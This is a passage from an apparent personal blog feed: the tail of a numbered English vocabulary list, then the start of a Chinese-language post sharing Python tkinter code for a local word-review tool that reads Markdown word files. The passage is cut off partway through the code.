e</li><li>supervise</li><li>qualification</li><li>intense</li><li>strive</li><li>inference</li><li>collapse</li><li>superficial</li><li>acceptance</li><li>persist</li><li>contrast</li><li>coherent</li><li>persuasion</li><li>fragment</li><li>precision</li><li>occupation</li><li>echo</li><li>miserable</li><li>momentary</li><li>recreation</li><li>commonplace</li><li>frequency</li><li>tendency</li><li>napkin</li><li>occurrence</li><li>reveal</li><li>generalize</li><li>aisle</li><li>projector</li><li>proceed</li><li>spacecraft</li><li>access</li><li>election</li><li>competent</li><li>remark</li><li>decent</li><li>inward</li><li>prediction</li><li>monstrous</li><li>insult</li><li>organic</li><li>generator</li><li>precaution</li><li>linear</li><li>liter</li><li>folk</li><li>mortgage</li><li>condense</li><li>thesis</li><li>acute</li><li>swell</li><li>auto</li><li>inform</li><li>burst</li><li>sustain</li><li>notify</li><li>stripe</li><li>heroic</li><li>ornamental</li><li>toll</li><li>pace</li><li>freight</li><li>solar</li><li>precious</li><li>suspicion</li><li>specialist</li><li>proposition</li><li>soften</li><li>passive</li><li>rifle</li><li>approval</li><li>wit</li><li>radical</li><li>sketch</li><li>briefcase</li><li>comprehension</li><li>formulation</li><li>startle</li><li>assure</li><li>definition</li><li>hearty</li><li>continuity</li><li>tremendous</li><li>gang</li><li>complaint</li><li>sociology</li><li>ownership</li><li>mechanism</li><li>observer</li><li>alliance</li><li>dorm</li><li>trash</li><li>spherical</li><li>quantify</li><li>anticipate</li><li>geology</li><li>earnest</li><li>seal</li><li>deficient</li><li>glance</li><li>clash</li><li>distract</li><li>versus</li><li>ware</li><li>automatic</li><li>encounter</li><li>fulfil</li><li>sacrifice</li><li>submit</li><li>empire</li><li>progressive</li><li>layout</li><li>sack</li><li>spot</li><li>gravity</li><li>dispute</li><li>primary</li><li>slope</li><li>reproduce</li><li>ore</li><li>orbit</li><li>association</li><li>elevate</li><li>advisable</li><li>soar</li><li>practicable</li><li>gymnasium</li><li>monetary</li><li>romance</li><li>spacious</li><li>goodness</li><li>recruit</li><li>contest</li><li>deserve</li><li>proper</li><li>herd</li><li>straighten</li><li>skeleton</li><li>concept</li><li>quest</li><li>attain</li><li>workout</li><li>corresponding</li><li>clinical</li><li>interviewed</li><li>respondents</li><li>resisting</li></ol><hr><ol start="961"><li>coil</li><li>inland</li><li>enormous</li><li>bug</li><li>brutal</li><li>counsel</li><li>battery</li><li>viewpoint</li><li>bloody</li><li>idle</li><li>concentration</li><li>philosopher</li><li>vehicle</li><li>exceedingly</li><li>palm</li><li>manufacture</li><li>likewise</li><li>haul</li><li>liver</li><li>gulf</li><li>hedge</li><li>crystal</li><li>courageous</li><li>junior</li><li>horsepower</li><li>contradiction</li><li>overlook</li><li>verify</li><li>operator</li><li>threaten</li><li>blast</li><li>identical</li><li>calculation</li><li>consequence</li><li>frustrate</li><li>satisfaction</li><li>decorative</li><li>amid</li><li>distribution</li><li>regularity</li><li>sole</li><li>colony</li><li>invasion</li><li>combination</li><li>economical</li><li>assurance</li><li>controversy</li><li>completion</li><li>legend</li><li>breadth</li><li>departure</li><li>so-called</li><li>clarify</li><li>criminal</li><li>assess</li><li>derive</li><li>naked</li><li>worship</li><li>ease</li><li>highlight</li><li>contract</li><li>bulletin</li><li>wasteful</li><li>coach</li><li>senate</li><li>pose</li><li>interrupt</li><li>cabinet</li><li>beneath</li><li>environmental</li><li>repetition</li><li>cease</li><li>luncheon</li><li>implication</li><li>inclination</li><li>comprehend</li><li>chill</li><li>moral</li><li>expose</li><li>furnish</li><li>ax</li><li>ditch</li><li>despair</li><li>diplomatic</li><li>poison</li><li>severe</li><li>infer</li><li>exclusive</li><li>solemn</li><li>fleet</li><li>spatial</li><li>soda</li><li>stretch</li><li>extensive</li><li>ignorance</li><li>plural</li><li>distinguish</li><li>payment</li><li>automate</li><li>dictator</li><li>trace</li><li>convert</li><li>peculiarity</li><li>cling</li><li>enlarge</li><li>recognition</li><li>independence</li><li>tragic</li><li>witty</li><li>insert</li><li>housing</li><li>muscular</li><li>explosion</li><li>photography</li><li>realization</li><li>circuit</li><li>compensate</li><li>disturbance</li><li>complex</li><li>manipulate</li><li>assembly</li><li>particle</li><li>criticism</li><li>version</li><li>twist</li><li>marginal</li><li>receiver</li><li>estate</li><li>mammal</li><li>boast</li><li>board</li><li>criticize</li><li>genius</li><li>observation</li><li>oval</li><li>successor</li><li>cultivate</li><li>sincerity</li><li>magnet</li><li>sideways</li><li>rug</li><li>reputation</li><li>ignorant</li><li>volunteer</li><li>approximate</li><li>allowance</li><li>majority</li><li>nevertheless</li><li>pigeon</li><li>moist</li><li>prime</li><li>elsewhere</li><li>hazard</li><li>contribute</li><li>announce</li><li>torch</li><li>liquor</li><li>widen</li><li>storage</li><li>graceful</li><li>accommodate</li><li>qualify</li><li>colonial</li><li>racial</li><li>episode</li><li>previous</li><li>exposure</li><li>competition</li><li>incline</li><li>attendant</li><li>shrimp</li><li>occupy</li><li>indication</li><li>outbreak</li><li>enthusiastic</li><li>productive</li><li>dean</li><li>grasp</li><li>haunt</li><li>aggressive</li><li>signal</li><li>interview</li><li>external</li><li>conform</li><li>mold</li><li>deprive</li><li>intention</li><li>regular</li><li>reported</li><li>sail</li><li>fulfillment</li><li>breathe</li><li>appears</li><li>resist</li><li>consistent</li><li>nearest</li><li>strategies</li><li>priorities</li><li>dedicate</li></ol><hr><ol start="1160"><li>exploit</li><li>quit</li><li>instruction</li><li>for</li><li>redesign</li><li>understood</li><li>catch-up</li><li>equipped</li><li>interface</li><li>subject</li><li>realise</li><li>self-awareness</li><li>chores</li><li>indeed</li><li>companies</li><li>unpopular</li><li>reconsidered</li><li>ongoing</li><li>professionals</li><li>realisation</li><li>schoolers</li><li>physically</li><li>species</li><li>pot</li><li>discard</li><li>quantitative</li><li>motive</li><li>ghost</li><li>humbly</li><li>interpretation</li><li>assume</li><li>magnetic</li><li>permanent</li><li>greeting</li><li>verge</li><li>span</li><li>aspect</li><li>revision</li><li>relation</li><li>religion</li><li>variable</li><li>banker</li><li>landscape</li></ol><hr><ol start="1203"><li>polar</li><li>section</li><li>scratch</li><li>injure</li><li>bolt</li><li>construct</li><li>通过…用来…从而…</li><li>高级的</li><li>spied</li></ol>]]></content>
    
    
    <categories>
      
      <category>英语</category>
      
      <category>英语单词</category>
      
      <category>二级单词</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：核心单词小工具</title>
    <link href="/2025/05/14/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%A0%B8%E5%BF%83%E5%8D%95%E8%AF%8D%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/05/14/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%A0%B8%E5%BF%83%E5%8D%95%E8%AF%8D%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Py-代码"><a href="#1-Py-代码" class="headerlink" title="1. Py 代码"></a>1. Py 代码</h2><p>创建 <code>核心单词小工具.py</code> 并编写代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> tkinter <span class="hljs-keyword">as</span> tk<br><span class="hljs-keyword">from</span> tkinter <span class="hljs-keyword">import</span> filedialog, messagebox<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> tkinter <span class="hljs-keyword">import</span> ttk<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> pyperclip<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WordViewer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, root</span>):<br>        <span class="hljs-variable language_">self</span>.root = root<br>        <span class="hljs-variable language_">self</span>.root.title(<span class="hljs-string">&quot;Markdown Word Viewer&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.words = []<br>        <span class="hljs-variable language_">self</span>.current_index = -<span class="hljs-number">1</span><br>        <span class="hljs-variable language_">self</span>.displayed_words = []<br>        <span class="hljs-variable language_">self</span>.log_file = <span class="hljs-string">&quot;wordviewer_log.txt&quot;</span><br>        <span class="hljs-variable language_">self</span>.start = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.end = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.range_applied = <span class="hljs-literal">False</span><br>        <span class="hljs-variable language_">self</span>.current_file = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.record_file = <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># Default file paths</span><br>        <span class="hljs-variable language_">self</span>.default_file = <span class="hljs-string">r&quot;E:\1、办公\4、博客\myNote\source\_posts\笔记：一级单词.md&quot;</span><br>        <span class="hljs-variable language_">self</span>.secondary_file = <span class="hljs-string">r&quot;E:\1、办公\4、博客\myNote\source\_posts\笔记：二级单词.md&quot;</span><br>        <span class="hljs-variable language_">self</span>.default_path = <span class="hljs-string">r&quot;E:\1、办公\4、博客\myNote\source\_posts&quot;</span><br>        <span class="hljs-variable language_">self</span>.record_file = <span class="hljs-variable language_">self</span>.secondary_file<br><br>        <span class="hljs-comment"># Set window size and center it</span><br>        window_width = <span class="hljs-number">700</span><br>        window_height = <span class="hljs-number">700</span><br>        screen_width = root.winfo_screenwidth()<br>        screen_height = root.winfo_screenheight()<br>        x = (screen_width - window_width) // <span class="hljs-number">2</span><br>        y = (screen_height - window_height) // <span class="hljs-number">2</span><br>        <span class="hljs-variable language_">self</span>.root.geometry(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;window_width&#125;</span>x<span class="hljs-subst">&#123;window_height&#125;</span>+<span class="hljs-subst">&#123;x&#125;</span>+<span class="hljs-subst">&#123;y&#125;</span>&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.root.configure(bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br><br>        <span class="hljs-comment"># Bind keyboard shortcuts</span><br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;Right&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.show_next_word())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;Left&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.show_previous_word())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;Control-c&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.copy_word())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;Up&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.record_word())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;Down&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.select_current_word())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;Delete&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.delete_word())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;Return&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.add_word())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;space&gt;&#x27;</span>, <span class="hljs-keyword">lambda</span> event: <span class="hljs-variable language_">self</span>.toggle_auto_play())<br>        <span class="hljs-variable language_">self</span>.root.bind(<span class="hljs-string">&#x27;&lt;MouseWheel&gt;&#x27;</span>, <span class="hljs-variable language_">self</span>.on_mousewheel)  <span class="hljs-comment"># Bind mouse wheel event</span><br><br>        <span class="hljs-comment"># Auto-play variables</span><br>        <span class="hljs-variable language_">self</span>.auto_play_on = <span class="hljs-literal">False</span><br>        <span class="hljs-variable language_">self</span>.auto_play_id = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.direction_var = tk.StringVar(value=<span class="hljs-string">&quot;forward&quot;</span>)<br><br>        <span class="hljs-comment"># Apply style</span><br>        <span class="hljs-variable language_">self</span>.style = ttk.Style()<br>        <span class="hljs-variable language_">self</span>.style.configure(<span class="hljs-string">&quot;TButton&quot;</span>, font=(<span class="hljs-string">&quot;Helvetica&quot;</span>, <span class="hljs-number">12</span>), padding=<span class="hljs-number">10</span>)<br>        <span class="hljs-variable language_">self</span>.style.<span class="hljs-built_in">map</span>(<span class="hljs-string">&quot;TButton&quot;</span>, <br>                      background=[(<span class="hljs-string">&#x27;active&#x27;</span>, <span class="hljs-string">&#x27;#45a049&#x27;</span>)],<br>                      foreground=[(<span class="hljs-string">&#x27;active&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>)])<br><br>        <span class="hljs-comment"># Create GUI components</span><br>        <span class="hljs-variable language_">self</span>.create_widgets()<br><br>        <span class="hljs-comment"># Initialize log</span><br>        <span class="hljs-variable language_">self</span>.log(<span class="hljs-string">&quot;WordViewer 初始化&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">log</span>(<span class="hljs-params">self, message</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Write debug information to log file.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-variable language_">self</span>.log_file, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;datetime.now()&#125;</span>: <span class="hljs-subst">&#123;message&#125;</span>\n&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_widgets</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Create and arrange GUI components.&quot;&quot;&quot;</span><br>        main_frame = tk.Frame(<span class="hljs-variable language_">self</span>.root, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        main_frame.pack(pady=<span class="hljs-number">20</span>, padx=<span class="hljs-number">20</span>, fill=<span class="hljs-string">&quot;both&quot;</span>, expand=<span class="hljs-literal">True</span>)<br><br>        file_frame = tk.Frame(main_frame, bg=<span class="hljs-string">&quot;#f0f2f5&quot;</span>)<br>        file_frame.pack(fill=<span class="hljs-string">&quot;x&quot;</span>, pady=<span class="hljs-number">10</span>)<br><br>        <span class="hljs-variable language_">self</span>.load_default_button = ttk.Button(file_frame, text=<span class="hljs-string">&quot;加载默认文件&quot;</span>, <br>                                            command=<span class="hljs-variable language_">self</span>.load_default_file, <br>                                            style=<span class="hljs-string">&quot;TButton&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.load_default_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.select_file_button = ttk.Button(file_frame, text=<span class="hljs-string">&quot;选择其他文件&quot;</span>, <br>                                           command=<span class="hljs-variable language_">self</span>.load_file, <br>                                           style=<span class="hljs-string">&quot;TButton&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.select_file_button.pack(side=<span class="hljs-string">&quot;left&quot;</span>, padx=<span class="hljs-number">5</span>)<br><br>        <span class="hljs-variable language_">self</span>.select_record_button = ttk.Button(file_frame, text=<span class="hljs-string">&quot;选择记录文件路径&quot;</span>, <br>                                              command=<span class="hljs-variable language_">self</span>.select_record_file, 